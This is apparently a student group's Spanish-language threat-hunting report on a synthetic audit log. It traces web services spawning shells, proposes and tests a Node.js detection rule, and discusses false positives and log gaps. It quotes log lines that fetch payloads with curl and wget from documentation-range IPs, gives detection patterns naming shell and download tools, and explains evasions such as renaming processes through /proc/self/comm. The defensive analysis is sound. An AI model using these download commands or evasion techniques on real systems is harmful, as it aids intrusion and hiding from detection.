# Detección y caza — Grupo 04

**Integrantes:** Lorenzo Bellomo (análisis), Agustin Ignacio Kloster (revisión, 30/10), Naim Guarino (revisión y pruebas en el lab, 01/11), Valentino Siadore (revisión documental, 01/11) · **Fecha:** jueves 29/10/2026

Fuente: `laboratorio/logs/audit.log` (21 líneas, 2026-10-27 09:40–09:49 UTC).
**Alcance de la revisión local (01/11/2026):** análisis documental del log sintético
y de las capturas existentes; no se levantó el laboratorio ni se ejecutaron las
instrucciones que aparecen en el log. Sus hosts y PIDs no identifican los
contenedores del taller. Se preservan las autorías anteriores.
Filtro inicial con `./scripts/detectar.sh`
([`capturas/02-detectar.txt`](capturas/02-detectar.txt)), que busca padres
`apache2|php-fpm|node|python` con hijos `sh|bash|curl|wget|nc`. Después se leyó el log
completo para ver la cadena de cada caso y las líneas que el filtro no cubre.

---

## 1. Hipótesis de caza

Si PHP2Shell o Node2Shell se explotaron, en web01 (PHP), api01 (Node) o svc01 (Python)
podríamos observar al **proceso del servicio** (`apache2`, `node`, `python`) como **padre** de
un **shell o descargador** (`sh`, `bash`, `curl`, `wget`, `nc`), a partir del 17/10
(inicio de búsqueda propuesto por la cronología de la consigna, no por este log),
y sobre todo después del 21/10, con argumentos de
reconocimiento (`id`, `whoami`, `uname`) o URLs a IPs externas.

**Desglose por host: qué esperamos ver y qué nos haría descartarla.** Una hipótesis
de caza sirve si se puede refutar; por eso cada fila dice también qué evidencia la
debilitaría. Los precursores salen del mecanismo descrito en
[`recursos/contexto.md`](../../recursos/contexto.md).

| Host | Padre | Hijo esperado | Desde | Evidencia esperada | La debilita |
|---|---|---|---|---|---|
| web01 | `apache2` | `sh`, `id`, `whoami`, `curl`, `wget` | 17/10; foco desde 21/10 08:37 UTC (primer request "parecido a PHP2Shell") | Hijo que no sea `apache2 -k start`. **Antes**, errores fatales u OOM de PHP o workers terminados por señal en `error.log`: el vector interrumpe PHP con un error fatal u OOM | Solo hijos `apache2 -k start`, recreación de workers al ritmo de la línea base y sin errores fatales en el período |
| api01 | `node` | `sh`, `curl`, `wget`, `perl`, `node` con argumentos distintos de `server.js` | 21/10 (disclose) | Hijo que no sea `node server.js`. **Antes**, reinicios del servicio y errores `Decompression failed` de body-parser (se vio en el lab que quedan en el log del contenedor, §5) | Ningún hijo salvo `node server.js` y ningún reinicio sin causa operativa |
| svc01 | `python` | `sh`, `uname`, `id` | Después de un acceso a web01 o api01: no recibe tráfico de Internet | Hijo que no sea `python app.py`. **Antes**, una conexión entrante desde otro servicio interno (en el lab, `py-lab` registra la IP de origen, §5) | Hijos solo `python app.py` y ninguna conexión interna fuera de lo habitual |
| Los tres | — | — | Ventanas de minutos | Comandos cortos en lotes, como los que describe Unit 42 para post-explotación con agentes; en sus casos, con marcadores `==SHELLUSER==` / `==PASSWD==` en los argumentos | — |

**Contraste con el log:** la parte de procesos se sostiene en los tres hosts (§2). Los
precursores no se pueden contrastar porque `audit.log` no registra errores de PHP,
reinicios ni conexiones (§5). Los marcadores de Unit 42 no aparecen
(`grep -cE '==SHELLUSER==|==PASSWD==' audit.log` → `0`); la ausencia no descarta
un agente, solo esa variante.

---

## 2. Hallazgos en `audit.log`

| Línea / timestamp | Host | Padre → hijo | ¿Anómalo? | Por qué |
|---|---|---|---|---|
| 2026-10-27T09:42:17Z (pid 903) y 09:42:18Z (pid 904) | web01 | `apache2` (812) → `sh -c id` → `id` | **Sí** | Shell de reconocimiento inesperado en el escenario. El padre registrado es 812: no se puede atribuir a un worker ni a PHP2Shell solo con este evento |
| 2026-10-27T09:43:03Z (pid 601) y 09:43:04Z (pid 602) | api01 | `node` (501) → `sh -c curl http://198.51.100.7/x` → `curl` | **Sí** | `server.js` no usa `child_process`: no hay motivo legítimo para que `node` cree un shell. Intenta solicitar `/x` a una IP del rango de documentación; no confirma descarga exitosa ni explotación de Node2Shell |
| 2026-10-27T09:44:22Z (pid 906) | web01 | `apache2` (812) → `wget http://198.51.100.9/a` | **Sí** | Intento de descarga sin shell intermedio registrado, dirigido a otra IP de documentación; resultado desconocido |
| 2026-10-27T09:45:10Z (pid 704) y 09:45:11Z (pid 705) | svc01 | `python` (701) → `sh -c uname -a` → `uname` | **Sí** | Reconocimiento del sistema en el servicio **interno**, que no recibe tráfico de Internet. Motiva investigar acceso interno; no prueba movimiento lateral sin conexiones o trazas correlacionadas |
| 09:42:40Z (1002), 09:44:10Z (1003), 09:49:00Z (1004) | db01 | `sshd` (1001) → `-bash` | Indeterminado | Sesiones SSH interactivas. Pueden ser de un administrador, pero ocurren dentro de la ventana del ataque y db01 no figura en el inventario |
| 09:41:12Z, 09:45:00Z, 09:47:00Z | api01 | `node` (501) → `node server.js` | Baja, a confirmar | Mismo binario y mismos argumentos que el servicio: compatible con un supervisor que reinicia la app. Pero rodean al `curl` de 09:43:03 (ver 2.2) |
| 09:41:30Z, 09:43:40Z | svc01 | `python` (701) → `python app.py` | Baja, a confirmar | Igual que el caso anterior; el de 09:43:40 precede en 90 s al `uname` (ver 2.2) |
| 09:40:01Z … 09:48:00Z | web01 | `apache2` (812) → `apache2 -k start` | No | Comportamiento normal: el master de Apache crea workers |

**¿Hay compromiso?** En el escenario sintético, las señales justifican tratar
web01, api01 y svc01 como un **incidente presunto de alta prioridad**, con alcance
indeterminado. Los eventos prueban lo representado en el archivo, no una intrusión
en los contenedores del grupo. En un caso real se corroborarían integridad del
registro, autorización de las acciones y contexto antes de confirmar el incidente.

- Lo que lo sostiene: tres servicios distintos ejecutan comandos que su código nunca
  ejecuta, en una ventana de 3 minutos (09:42:17–09:45:11), con una secuencia compatible
  con reconocimiento e intentos de descarga. Eso no demuestra automatización, un
  mismo actor ni relación causal entre hosts. Las dos IPs pertenecen al rango de
  documentación 198.51.100.0/24: no son indicadores reales para bloquear fuera del ejercicio.
- Lo que no sabemos: si las descargas tuvieron éxito, qué se ejecutó después, si hubo
  persistencia, ni quién abrió las sesiones de db01. Con estas líneas no se puede
  confirmar el vector exacto (PHP2Shell, Node2Shell u otro), solo que los procesos de
  los servicios ejecutaron comandos.
- Decisión: tratarlo como incidente en web01, api01 y svc01 (aislar, preservar
  evidencia, rotar secretos que esos servicios tengan), e investigar db01.

### 2.1. De qué proceso cuelgan los hallazgos

En los tres hosts, el proceso sospechoso tiene como padre el **mismo PID que crea las
instancias del servicio**:

| Host | PID padre | Qué más crea ese PID | Hallazgo |
|---|---|---|---|
| web01 | 812 | los workers `apache2 -k start` (900–908) | `sh -c id`, `wget` |
| api01 | 501 | las instancias `node server.js` (600, 603, 604) | `sh -c curl …` |
| svc01 | 701 | las instancias `python app.py` (702, 703) | `sh -c uname -a` |

El árbol sintético atribuye los hijos al PID principal de cada servicio, pero
no registra UID ni permite asociar esos PIDs con los contenedores reales. Aunque
las capturas del taller muestren un master de Apache root y workers `www-data`,
no se puede trasladar esa identidad al PID 812 del archivo. El shell no demuestra
por sí solo ejecución como root ni un vector específico.

Para resolverlo en un incidente real se necesitarían eventos con UID/EUID, ruta
del ejecutable, identidad de host/contenedor y ascendencia, correlacionados con los
logs de acceso. La regla de la sección 4 solo cubre el padre directo.

### 2.2. Posibles reinicios cerca de los hallazgos

El log muestra nuevas ejecuciones de `node server.js`, `python app.py` y Apache,
no la terminación de instancias anteriores. Por eso se las considera **posibles
reinicios o creación de procesos**, no crashes confirmados.

En svc01 la ejecución de 09:43:40 precede al `uname` en 90 segundos; en api01 el
`curl` de 09:43:03 queda entre ejecuciones de 09:41:12 y 09:45:00. La proximidad
justifica correlación, pero no atribución a una explotación. También puede existir
reciclado programado o administración legítima.

**Mejora propuesta:** incorporar códigos de salida, señales, eventos OOM, logs de
aplicación e identidad de instancia. Alertar por un aumento de terminaciones
anómalas respecto de la línea base; un crash aislado no demuestra un ataque.

### 2.3. `apache2` → `wget` sin shell intermedio (línea 14)

Tres de los cuatro hallazgos pasan por `sh -c` (líneas 6, 9 y 16), que es lo que
hacen `system()`/`exec()` en PHP, `child_process.exec` en Node y
`os.system`/`subprocess(shell=True)` en Python. La línea 14 no: `apache2` lanza
`wget` directamente. Eso es compatible con una ejecución que no pasa por el shell
(por ejemplo `proc_open` con el comando como arreglo, disponible desde PHP 7.4, o
`pcntl_exec`), con un cambio de técnica entre 09:42 y 09:44, o con un registro
incompleto. El log no permite elegir entre esas opciones.

Consecuencia para la detección: una regla que exija `sh` como hijo directo del
servicio **pierde** esta línea. Por eso la lista de hijos tiene que incluir los
descargadores como hijos directos, como ya hacen `detectar.sh` y la regla de §4.
Como dato del lab, no del log: la imagen `php:8.3.35-apache` no trae `wget`, pero sí
`curl` ([`capturas/08`](capturas/08-contencion-pruebas-antes.txt) §8).

---

## 3. Falsos positivos

- **`sshd` → `-bash` en db01.** El guion inicial (`-bash`) indica un shell de login: es
  lo que se ve cuando una persona entra por SSH. Puede ser un administrador
  revisando la base durante el incidente. Para distinguirlo hace falta lo que el log
  no trae: usuario, IP de origen, método de autenticación (clave o contraseña) y si
  ese usuario suele entrar a esa hora. Si fue alguien del equipo, se descarta con
  el registro de cambios o preguntando; si no, es el pivote más grave del log.
- **`node` → `node server.js` y `python` → `python app.py`.** A primera vista "el
  servicio lanzando procesos" parece la misma señal que los hallazgos, pero el hijo
  es el propio servicio con sus argumentos normales. Una regla que alerte por
  cualquier hijo de `node` los marcaría; por eso la regla de la sección 4 filtra por
  el binario hijo.
- **Healthcheck de Docker en el lab.** `docker top node-lab` muestra
  `node -e fetch('http://127.0.0.1:3000/')…` cada 5 s. Parece un `node` ejecutando
  código arbitrario, pero es el healthcheck del compose y su padre es el runtime del
  contenedor, no `node server.js`
  ([`capturas/07-contencion-y-procesos-despues.txt`](capturas/07-contencion-y-procesos-despues.txt)).

---

## 4. Regla propuesta para Node.js

**Qué observa:** eventos de creación de procesos (`execve`) en el host o contenedor
de la API, con el nombre del proceso padre y del hijo, como los de `audit.log`.

**Condición que dispara:**

```text
host = api01
AND ppid_comm = node
AND comm IN (sh, bash, dash, ash, curl, wget, nc, ncat, python, perl)
→ alerta de alta prioridad: validar contexto + preservar evidencia + decidir contención
```

La condición es una propuesta, no una regla desplegada. El contraste estático con
`audit.log` selecciona la **línea 9**, de 2026-10-27T09:43:03Z (`node` → `sh`).
La línea 10 (`sh` → `curl`) no coincide por padre directo. La lista propuesta
amplía la de `detectar.sh`; no son reglas idénticas.

Reproducción de solo lectura, desde la raíz del repositorio:

```bash
awk '$2=="host=api01" && $4=="ppid_comm=node" && $6 ~ /^comm=(sh|bash|dash|ash|curl|wget|nc|ncat|python|perl)$/ {print NR ":" $0}' laboratorio/logs/audit.log
```

Resultado del contraste sobre la copia del log: una coincidencia, línea 9. No se
interpretan ni ejecutan sus argumentos. Esto comprueba selección sobre un fixture,
no captura real de `execve`, entrega de alertas ni aislamiento automático. Antes de
desplegar una respuesta automática se requieren pruebas de falsos positivos,
aprobación del responsable y un procedimiento de recuperación.

**Por qué comparar campos y no hacer `grep` sobre la línea entera.** El filtro de
`detectar.sh` busca `comm=(sh|bash|…)` sin anclar y sobre toda la línea, que incluye
`args`, el único campo que controla el atacante. Con una línea de ejemplo
(no está en `audit.log`):

```text
2026-10-27T09:50:00Z host=web01 ppid=700 ppid_comm=cron pid=701 comm=sha256sum args="sha256sum /tmp/ppid_comm=python"
```

el `grep` de `detectar.sh` la marca: `comm=sh` coincide con el prefijo de
`sha256sum` y `ppid_comm=python` coincide **dentro de los argumentos**, aunque el
padre real es `cron`. Es un falso positivo, y la misma técnica permite meter texto
en `args` para confundir a quien lea el resultado. La regla de arriba compara campos
fijos (`$4`, `$6`) con anclas `^…$` y no cae. Sobre el `audit.log` real los dos dan
lo mismo (líneas 6, 9, 14 y 16 con la lista de `detectar.sh`), así que la diferencia
no cambia los hallazgos, pero sí la confianza en la regla.

**Qué aporta el lab sobre la regla** (evidencia del 01/11, no del log):

- La imagen de `node-lab` trae `sh`, `bash` y `perl`, pero **no** `curl`, `wget` ni `nc`
  ([`capturas/08`](capturas/08-contencion-pruebas-antes.txt) §8). En una imagen así la
  cadena de la línea 9 fallaría en `curl`, pero `sh` se habría ejecutado igual: la
  regla dispara por el primer salto, aunque el descargador no exista. Un atacante
  que lo sepa usaría `fetch` desde el propio proceso o `perl`; `perl` está en la
  lista, `fetch` es el falso negativo de memoria.
- **Señal complementaria sin `execve`:** un cuerpo que no es Brotli con
  `Content-Encoding: br` deja en `docker compose logs node-lab` un
  `Error: Decompression failed … BrotliDecoder.zlibOnError` con
  `code: 'ERR__ERROR_FORMAT_PADDING_1'`
  ([`capturas/15`](capturas/15-logs-de-servicio.txt)). Una ráfaga de esos errores
  indica que alguien está probando entradas contra el decoder, que es lo previo a
  Node2Shell. Cubre en parte el falso negativo "payload en memoria", porque no
  depende de que se cree un proceso. Límite: el error no trae la IP de origen ni la
  ruta, porque `server.js` no tiene log de accesos.

**Por qué sin excepciones:** `server.js` solo responde JSON y descomprime Brotli; no
usa `child_process`. Cualquier hijo distinto de `node server.js` es anómalo. Si en
el futuro la app necesitara lanzar procesos, se agrega una excepción explícita por
ruta y argumentos, no por nombre.

**Falsos negativos que puede tener:**

- **Payload en memoria:** Node2Shell es una escritura fuera de rango en el decoder; un
  exploit puede descargar y ejecutar con `fetch`, `net` o `vm` de Node **sin crear
  ningún proceso**. La regla no ve nada. Para eso hace falta telemetría de red
  (conexiones salientes de `node`) o de comportamiento.
- **Binario renombrado o no listado:** `busybox`, `/tmp/x`, `node -e …` (un hijo
  `node` con argumentos distintos de `server.js`). Mejora: alertar por cualquier
  hijo que no sea exactamente `node server.js`.
- **Cadenas largas:** `node` → `python` → `sh`; la regla ve el primer salto solo si
  `python` está en la lista. Mejora: evaluar la ascendencia completa (algún ancestro
  `node`) en lugar del padre directo (ver 2.1).
- **Intentos fallidos:** un exploit que crashea `node` sin llegar a ejecutar nada no
  crea hijos. Se cubre con la alerta de reinicios por crash de la sección 2.2.
- **El nombre del proceso lo controla el propio proceso.** La regla compara
  `ppid_comm` y `comm`, que son el nombre corto que guarda el kernel, no la ruta del
  ejecutable. Un proceso puede cambiar su propio nombre escribiendo en
  `/proc/self/comm` (o con `prctl(PR_SET_NAME)`), y el `read_only` del contenedor no lo
  impide porque `/proc` no es parte del filesystem de la imagen. Si el código del
  atacante ya corre dentro de `node`, puede renombrar ese proceso a, por ejemplo,
  `apache2` antes de lanzar `sh`: el evento saldría con `ppid_comm=apache2` en api01
  y la regla no dispararía. Además, el kernel corta ese nombre en **15 caracteres**:
  un binario llamado `curl-estatico-x86` aparece como `curl-estatico-x` y no coincide
  con `curl` en una comparación exacta. Mejora: comparar por la **ruta del
  ejecutable** del padre y del hijo (`/proc/<pid>/exe`, o el campo `exe` de auditd o
  eBPF) y por identidad del contenedor, no por nombre. Lo comprobamos en un Linux
  común, **fuera del lab** y sin nada malicioso: un proceso sin privilegios escribió
  `apache2` en su `/proc/self/comm`, y el `sh` que lanzó después vio a su padre como
  `apache2`; una copia de `sleep` llamada `curl-estatico-x86` figuró como
  `curl-estatico-x`. No lo repetimos dentro de `node-lab`.
- **Procesos muy cortos:** si la telemetría muestrea (como `docker top`) en vez de
  registrar cada `execve`, un `curl` de un segundo se pierde.

---

## 5. Limitaciones del log

- **Sin usuario/UID:** no se sabe si `sh` corrió como `www-data`, `node` o root, ni
  quién abrió las sesiones SSH en db01.
- **Sin IP de origen:** no se puede vincular cada proceso con la petición HTTP que lo
  disparó ni con una IP atacante; tampoco distinguir un admin de un intruso en db01.
- **Sin resultado:** no hay código de salida, bytes descargados ni archivos creados;
  no sabemos si `curl`/`wget` funcionaron.
- **Retención y cobertura:** cubre 9 minutos del 27/10. No hay nada del 17/10 al
  27/10, cuando ya había intentos de explotación, ni después de las 09:49.
- **Sin telemetría de red:** no hay registro de conexiones a 198.51.100.7 y
  198.51.100.9 ni del tráfico entre hosts (necesario para confirmar el movimiento
  lateral hacia svc01 y db01).
- **Sin hash ni ruta completa** del binario: un `sh` falso o renombrado se vería igual.
- **Relojes sin garantía de sincronía:** la secuencia entre hosts (web01 09:42 →
  api01 09:43 → svc01 09:45, y db01 en el medio) se arma comparando timestamps de
  cuatro máquinas distintas. Eso supone que sus relojes estaban sincronizados (NTP) y
  el log no lo acredita. Con una deriva de un par de minutos, el orden se puede
  invertir: por ejemplo, la primera sesión SSH de db01 (09:42:40) podría ser anterior
  a todo lo de web01. Dentro de un mismo host el orden es confiable; **entre hosts**,
  la secuencia es una hipótesis. Además, la resolución es de **1 segundo**: `sh -c id`
  e `id` (09:42:17 y :18) quedan separados, pero dos eventos del mismo segundo no se
  pueden ordenar. Para un incidente real habría que registrar el estado de NTP de
  cada host junto con los eventos.
- **Hosts sin contexto:** db01 aparece en el log pero no en nuestro inventario.
- **Log sintético:** es un ejercicio; las IPs son de un rango de documentación y los
  PIDs no corresponden al laboratorio que levantamos.

**Las fuentes que faltan, ¿existen en el lab?** Se revisaron el 01/11 los logs de
cada servicio ([`capturas/15`](capturas/15-logs-de-servicio.txt)):

| Servicio | ¿Registra pedidos? | ¿IP de origen? | ¿Sobrevive a un reinicio? |
|---|---|---|---|
| `py-lab` (svc01) | Sí, en `docker compose logs` | **Sí**: `172.27.0.3 - "GET / HTTP/1.1" 200` (la IP de `node-lab`) | Sí, mientras exista el contenedor |
| `node-lab` (api01) | No: `server.js` no tiene log de accesos; solo quedan los errores, con stack trace | No | Sí, mientras exista el contenedor |
| `php-lab` (web01) | Sí, en `/var/log/apache2/access.log`, **pero no** en `docker compose logs` | Sí | **No** |

El caso de PHP es el más delicado. La imagen oficial enlaza `access.log` y `error.log`
a stdout/stderr, pero el compose monta un `tmpfs` en `/var/log/apache2` que tapa esos
enlaces. Resultado medido: el acceso desde `node-lab` quedó en `access.log` (81 bytes)
y no en los logs de Docker; después de `docker compose restart php-lab`, `access.log`
quedó en **0 bytes**. Es decir, la fuente principal para correlacionar PHP2Shell
(pedidos y errores fatales de PHP) es volátil, y el reinicio que pide la mitigación
de `upload_progress` la borra. En un incidente real hay que **copiar esos logs antes
de reiniciar** y, en producción, enviarlos a un colector externo. No se modifica el
compose del lab.

Cuidado con el comando obvio: `docker compose cp php-lab:/var/log/apache2 <destino>`
termina sin error, pero copia la capa de la imagen (los enlaces a `/dev/stdout` y
`/dev/stderr`), **no** el contenido del `tmpfs`. Lo que sí funciona, probado:

```bash
docker compose exec -T php-lab tar -C /var/log -cf - apache2 > apache2-logs.tar
```

Para svc01 esto cambia lo que se puede afirmar: la conexión entrante desde otro
servicio, que es lo que sostendría la hipótesis de movimiento lateral, **sí** quedaría
registrada en un despliegue como el del lab. `audit.log` no la trae porque solo
registra procesos.

**Criterio de cierre:** una descarga fallida, un healthcheck correcto o la ausencia
de coincidencias no descartan ejecución previa ni acceso a datos. Para cerrar se
requieren cobertura suficiente, explicación de las acciones, búsqueda de
persistencia y correlación con red, archivos y autenticación. Si esa evidencia no
existe, el resultado es indeterminado. La falta de registros entre el 17/10 y el
27/10 es una limitación de cobertura, no prueba de ausencia de actividad.
